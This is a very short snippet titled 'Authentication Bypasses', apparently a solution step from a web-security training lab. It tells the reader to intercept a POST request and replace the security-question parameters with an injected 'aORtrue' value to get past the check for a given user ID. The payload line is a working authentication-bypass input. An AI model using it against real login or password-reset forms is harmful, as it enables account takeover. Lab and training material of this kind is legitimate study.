## Authentication Bypasses
* Intercept the POST request, and modify the secQuestion0 and secQuestion1 parameters in the following manner (note the parentheses):
```js
(secQuestion0=aORtrue)&(secQuestion1=aORtrue)&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
```
